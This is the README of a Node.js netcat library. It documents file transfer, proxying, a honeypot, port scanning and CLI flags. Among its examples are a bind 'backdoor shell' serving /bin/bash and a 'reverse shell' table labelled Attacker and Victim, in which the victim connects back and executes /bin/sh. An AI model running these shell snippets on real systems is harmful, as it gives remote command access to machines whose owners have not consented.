# netcat [![NPM Version](https://img.shields.io/npm/v/netcat.svg)](https://www.npmjs.com/package/netcat) [![Build Status](https://travis-ci.org/roccomuso/netcat.svg?branch=master)](https://travis-ci.org/roccomuso/netcat) [![JavaScript Style Guide](https://img.shields.io/badge/code_style-standard-brightgreen.svg)](https://standardjs.com)

> Netcat client and server modules written in pure Javascript for Node.js.

**Under active development... stay out**

This module implements all the basic netcat's features. To use as standalone tool install the [nc](https://github.com/roccomuso/nc) package.

## What you can do :computer:

- [x] Backdoor (Reverse Shell)
- [x] Honeypot
- [x] File transfer
- [x] Port forwarding
- [x] Proxy
- [x] Web Server
- [ ] Port scanning

| OS    |  Supported |
|-------|--------------------|
| Linux | :white_check_mark: |
| Mac OS | :white_check_mark: |
| Windows | :white_check_mark: |

## Enhancement

- [ ] Crypto

## Install

    $ npm install --save netcat

## Usage

```javascript
const NetcatServer = require('netcat/server')
const NetcatClient = require('netcat/client')
const nc = new NetcatServer()
const nc2 = new NetcatClient()
```

Available Options:

```
{
  protocol: 'tcp',
  address: '0.0.0.0',
  port: null
}
```

## Examples

| JS API              | CLI equivalent                     |
|---------------------|------------------------------------|
|`nc.port(2389).listen()` | `nc -l -p 2389` |

#### Server and Client connection

| Server                 | Client                             |
|------------------------|------------------------------------|
|`nc.port(2389).listen()`|`nc2.addr('127.0.0.1').port(2389).connect()`|

#### Transfer file

| Server              | Client                             |
|---------------------|------------------------------------|
|`nc.port(2389).listen().pipe(outputStream)`|`inputStream.pipe(nc2.port(2389).connect().stream())`|

or viceversa you can do the equivalent of `nc -l -p 2389 < filename.txt` and when someone else connects to your port 2389, the file is sent to them whether they wanted it or not:

| Server              | Client                             |
|---------------------|------------------------------------|
|`nc.port(2389).serve('filename.txt').listen()`|`nc2.port(2389).connect().pipe(outputStream)`|

#### Keepalive connection

| Server              | Client                             |
|---------------------|------------------------------------|
|`nc.port(2389).k().listen()`|`inputStream.pipe(nc2.port(2389).connect().stream())`|

The server will be kept alive and not being closed after the first connection. (`k()` is an alias for `keepalive()`)

#### Serve raw buffer

| Server              | Client                             |
|---------------------|------------------------------------|
|`nc.port(2389).listen().serve(Buffer.from('Hello World'))`|`nc2.port(2389).connect().on('data', console.log)`|

#### Backdoor shell

| Server              | Client                             |
|---------------------|------------------------------------|
|`nc.port(2389).listen().exec('/bin/bash')`|`process.stdin.pipe(nc2.port(2389).connect().pipe(process.stdout).stream())`|

The `exec()` method execute the given command and pipe together his `stdout` and `stderr` with the clients `socket`.

#### Reverse shell

| Attacker              | Victim                           |
|---------------------|------------------------------------|
|`nc.port(2389).listen().serve(process.stdin).pipe(process.stdout)`|`nc2.port(2389).retry(5000).connect().exec('/bin/sh')`|

#### Netcat as a proxy

Netcat can be very easily configured as a proxy server:

```javascript
var nc = new NetcatServer()
var nc2 = new NetcatClient()
nc2.addr('google.com').port(80).connect()
nc.port(8080).k().listen().proxy(nc2.stream())
```

All the traffic flowing on `localhost:8080` will be redirected to `google.com:80`.
Similarly you can setup a port forwarding using the same host.

#### Honeypot

Pretend to be an Apache server:

```javascript
var apache = `HTTP/1.1 200 OK
Date: Sat, 27 May 2017 16:51:02 GMT
Server: Apache/2.4.7 (Ubuntu)
Cache-Control: public, max-age=0
Content-Type: text/html; charset=utf-8
Content-Length: 16894
Vary: Accept-Encoding
`
var nc = new NetcatServer()
var logFile = fs.createWriteStream('log.txt')
nc.port(80).k().listen().serve(Buffer.from(apache)).pipe(logFile)
```

#### Port scanning

The netcat client provides also a basic port scan functionality.

```javascript
var nc = new NetcatClient()
nc.addr('127.0.0.1').scan('22-80', function(ports){
 // ports: { '22': 'open', '23': 'closed' ... }
})
```

TCP protocol is used by default, if you wanna change the protocol use the `.udp()` method.
`scan(...)` accepts also an array or a integer number.

## API

#### `port(<port>)`

Netcat can bind to any local port, subject to privilege restrictions and ports that are already in use.

#### `listen()`

#### `keepalive()` or `k()`

When you set the keepalive, the server will stay up and possibly the outStream given to `pipe(outStream)` kept open.

#### `serve()`

The `serve` method accepts either a string (indicating a file name), a Readable stream or a Buffer.
When you pass a readable stream the keepalive method could cause the stream to be consumed at the first request and no more can be served (The stream is not cached in a buffer).

#### `exec()`

The `exec()` method execute the given command and pipe together his `stdout` and `stderr` with the clients `socket`. It accepts a string and an array of args as second param. If a pipe char is found `|` then all the commands will be processed under a `sh -c`.

Example:

```javascript
nc.p(2389).exec('base64', ['-d']).listen()
// OR
nc.p(2389).exec('base64 | grep hello').listen()
```

## Events

The netcat server extends the `EventEmitter` class. You'll be able to catch some events straight from the sockets. For example the `data` event:

| Server              | Client                    |
|---------------------|------------------------------------|
|`nc.port(2389).listen().on('data', onData)`|`inputStream.pipe(nc2.port(2389).connect().stream())`|

```javascript
function onData (socket, chunk) {
  console.log(socket.id, 'got', chunk) // Buffer <...>
}
```

## CLI usage

For the standalone usage install the `nc` CLI package:

    $ npm install -g nc

Example:

    $ # Listen for inbound
    $ nc -l -p port [- options] [hostname] [port]


Available options:


- [x] `-c shell commands    as '-e'; use /bin/sh to exec [dangerous!!]`
- [x] `-e filename          program to exec after connect [dangerous!!]`
- [ ] `-b                   allow broadcasts`
- [ ] `-g gateway           source-routing hop point[s], up to 8`
- [ ] `-G num               source-routing pointer: 4, 8, 12`
- [x] `-i secs              delay interval for lines sent, ports scanned (client-side)`
- [x] `-h                   this cruft`
- [x] `-k set               keepalive option on socket`
- [x] `-l                   listen mode, for inbound connects`
- [ ] `-n                   numeric-only IP addresses, no DNS`
- [ ] `-o file              hex dump of traffic (CLI)`
- [x] `-p port              local port number`
- [ ] `-r                   randomize local and remote ports`
- [ ] `-q secs              quit after EOF on stdin and delay of secs`
- [x] `-s addr              local source address`
- [ ] `-T tos               set Type Of Service`
- [ ] `-t                   answer TELNET negotiation`
- [ ] `-u                   UDP mode`
- [x] `-v                   verbose`
- [x] `-w secs              timeout for connects and final net reads (client-side)`
- [ ] `-z                   zero-I/O mode [used for scanning]`


## DEBUG

Debug matches the verbose mode.
You can enable it with the `verbose: true` param or the env var `DEBUG=netcat:*`

## Tests

Run them with: `npm test`

Coverage:

- [x] Test the `.serve(input)` method
- [x] Tests the keepalive connection with `.pipe()` and `serve()`.
- [x] serve can accepts both a string or a stream.
- [x] `exec()` method
- [ ] Hex dump
- [x] Backdoor shell
- [x] Proxy server
- [ ] UDP.

## Known limitations

None

## Author

Rocco Musolino ([@roccomuso](https://twitter.com/roccomuso))
